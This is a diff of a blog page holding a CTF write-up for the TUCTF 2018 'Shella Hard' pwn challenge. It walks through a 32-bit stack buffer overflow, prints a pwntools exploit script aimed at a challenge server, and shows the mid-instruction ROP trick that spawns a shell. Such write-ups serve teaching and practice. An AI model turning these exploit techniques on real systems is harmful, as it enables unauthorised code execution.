@@ -18,23 +18,21 @@
   
   
   <title>[Pwn] TUCTF 2018 - Shella Hard | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Shella Hard475Difficulty: mind-melting hardThis program is crap! Is there even anything here?nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB exec">
+  <meta name="description" content="Shella Hard 475 Difficulty: mind-melting hard This program is crap! Is there even anything here? nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB">
 <meta name="keywords" content="tuctf2018,rop,pwn,jump_middle_instruction">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] TUCTF 2018 - Shella Hard">
 <meta property="og:url" content="https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Shella Hard475Difficulty: mind-melting hardThis program is crap! Is there even anything here?nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB exec">
+<meta property="og:description" content="Shella Hard 475 Difficulty: mind-melting hard This program is crap! Is there even anything here? nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/4kHNIuW.png">
 <meta property="og:image" content="https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/libc-database">
 <meta property="og:image" content="https://i.imgur.com/2i3tBMQ.png">
-<meta property="og:image" content="https://i.imgur.com/KlGtbmw.png">
-<meta property="og:image" content="https://i.imgur.com/QVNPHVS.png">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] TUCTF 2018 - Shella Hard">
-<meta name="twitter:description" content="Shella Hard475Difficulty: mind-melting hardThis program is crap! Is there even anything here?nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB exec">
+<meta name="twitter:description" content="Shella Hard 475 Difficulty: mind-melting hard This program is crap! Is there even anything here? nc 3.16.169.157 12345  We were given a 32 bit binary: 12$ file shella-hard shella-hard: ELF 32-bit LSB">
 <meta name="twitter:image" content="https://i.imgur.com/4kHNIuW.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/index.html">
@@ -347,27 +345,40 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 879(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 890(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 5(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 6(minutes)</span>
 	
 
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <blockquote><br>Shella Hard<br>475<br><br>Difficulty: mind-melting hard<br>This program is crap! Is there even anything here?<br><br>nc 3.16.169.157 12345<br><br></blockquote>
-
+        <blockquote>
+Shella Hard
+475
+<p>Difficulty: mind-melting hard<br>
+This program is crap! Is there even anything here?</p>
+<p>nc 3.16.169.157 12345</p>
+</blockquote>
 <p>We were given a 32 bit binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file shella-hard </span><br><span class="line">shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped</span><br></pre></td></tr></table></figure>
-<p>Checking it’s security we can see we have <strong>NX enabled</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shella-hard</span><br><span class="line">[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
-<p>Now looking at the main function on radare2:<br><img src="https://i.imgur.com/4kHNIuW.png" alt></p>
+<p>Checking it’s security we can see we have <strong>NX enabled</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shella-hard</span><br><span class="line">[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>Now looking at the main function on radare2:<br>
+<img src="https://i.imgur.com/4kHNIuW.png" alt></p>
 <p>We can easily see we have a buffer overflow here, the <strong>buf</strong> is located at <strong>ebp-0x10</strong> and we are allowed to read up to 0x30 bytes with the <strong>read</strong> instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big <strong>rop chain</strong>, the binary is <strong>dynamic linked</strong> and the admins didn’t provide any <strong>libc</strong> file, even when not provided we can still use <img src="libc-database" alt="https://github.com/niklasb/libc-database"> to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like <strong>printf</strong>, <strong>puts</strong> or even <strong>write</strong>.</p>
-<p>So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named <strong>giveShell</strong>, which uses <strong>execve</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/2i3tBMQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/2i3tBMQ.png" alt><br></a></p>
-<p>After calculating the offsets to the return address we get something like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> process(<span class="string">'./shella-hard'</span>, aslr=<span class="keyword">False</span>, env=&#123;&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'3.16.169.157'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">debug = <span class="keyword">True</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./shella-hard'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIVESHELL = <span class="number">0x0804845c</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">  gdb.attach(r, <span class="string">"""b main</span></span><br><span class="line"><span class="string">b *0x08048457</span></span><br><span class="line"><span class="string">b *0x08048467</span></span><br><span class="line"><span class="string">b *0x08048449</span></span><br><span class="line"><span class="string">c"""</span>)</span><br><span class="line">r.send(<span class="string">'A'</span>* <span class="number">20</span> + p32(GIVESHELL))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named <strong>giveShell</strong>, which uses <strong>execve</strong>:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/2i3tBMQ.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/2i3tBMQ.png" alt><br>
+</a></p>
+<p>After calculating the offsets to the return address we get something like this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> process(<span class="string">'./shella-hard'</span>, aslr=<span class="keyword">False</span>, env=&#123;&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'3.16.169.157'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">debug = <span class="keyword">True</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./shella-hard'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIVESHELL = <span class="number">0x0804845c</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">  gdb.attach(r, <span class="string">"""b main</span></span><br><span class="line"><span class="string">b *0x08048457</span></span><br><span class="line"><span class="string">b *0x08048467</span></span><br><span class="line"><span class="string">b *0x08048449</span></span><br><span class="line"><span class="string">c"""</span>)</span><br><span class="line">r.send(<span class="string">'A'</span>* <span class="number">20</span> + p32(GIVESHELL))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>But as we can see it looks broken? the address <strong>0x6a006a44</strong> will make us to crash into a <strong>page fault</strong>, as we can see here on gdb if we try to jump immediately into that function:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/KlGtbmw.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KlGtbmw.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/KlGtbmw.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/KlGtbmw.png)
+</a>
 <p>After loosing some time and trying another things I remembered reading a paper about a cool <strong>ROP</strong> technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049166: 66 90                 xchg   %ax,%ax</span><br><span class="line">8049168: 80 3c 1f c3           cmpb   $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure>
 <p>For example this could be a sample snippet from <strong>objdump</strong>.</p>
@@ -378,16 +389,20 @@
 <p>This value is really important because it happens to be the machine code for the “ret” instruction.</p>
 <p>So the trick here is to jump into the middle of this instruction:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmpb $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure>
-<p>For instance at address <strong>0x8049166a</strong>. The CPU would see the following machine code sequence:<br><code>1f c3</code></p>
+<p>For instance at address <strong>0x8049166a</strong>. The CPU would see the following machine code sequence:<br>
+<code>1f c3</code></p>
 <p>Which will be interpreted as:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.data&gt;:</span><br><span class="line">   0: 1f                    pop    %ds</span><br><span class="line">   1: c3                    ret</span><br></pre></td></tr></table></figure>
-<p>Finding a hidden <strong>rop gadget</strong>, we can use the same idea in the function <strong>givenShell</strong>: </p>
+<p>Finding a hidden <strong>rop gadget</strong>, we can use the same idea in the function <strong>givenShell</strong>:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ (fcn) sym.giveShell 26</span><br><span class="line">|   sym.giveShell ();</span><br><span class="line">|           0x08048458      55             push ebp</span><br><span class="line">|           0x08048459      89e5           mov ebp, esp</span><br><span class="line">|           0x0804845b      90             nop</span><br><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br><span class="line">|           0x08048461      006800         add byte [eax], ch</span><br><span class="line">|           0x08048464      850408         test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19</span><br><span class="line">|           0x08048467      e8b4feffff     call sym.imp.execve</span><br><span class="line">|           0x0804846c      83c40c         add esp, 0xc</span><br><span class="line">|           0x0804846f      90             nop</span><br><span class="line">|           0x08048470      c9             leave</span><br><span class="line">\           0x08048471      c3             ret</span><br><span class="line">[0x08048340]&gt;</span><br></pre></td></tr></table></figure>
-<p>What I did was to jump into the middle of:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br></pre></td></tr></table></figure></p>
+<p>What I did was to jump into the middle of:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br></pre></td></tr></table></figure>
 <p>So lets see what happens what’s the “transformation” in radare if we jump into the middle:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/QVNPHVS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QVNPHVS.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/QVNPHVS.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/QVNPHVS.png)
+</a>
 <p>This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found.</p>
-<p>Now fixing our python script: </p>
+<p>Now fixing our python script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python shella-hard.py</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./shella-hard'</span>: pid <span class="number">1190</span></span><br><span class="line">[!] ASLR <span class="keyword">is</span> disabled!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">core  flag  output32  shella-hard  shella-hard.py  wtf.c</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;test-flag-here&#125;</span><br></pre></td></tr></table></figure>
 <p>No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.</p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
@@ -485,7 +500,7 @@
 
     <div class="copyright">
     	
-        &copy; 2022 TEAMROCKETIST
+        &copy; 2023 TEAMROCKETIST
         
         
     </div>
@@ -575,15 +590,14 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-    <script defer type="text/javascript">
-(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y11W83X49"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-ga('create', 'UA-104385070-1', 'auto');
-ga('send', 'pageview');
-
+  gtag('config', 'G-9Y11W83X49');
 </script>
 
 
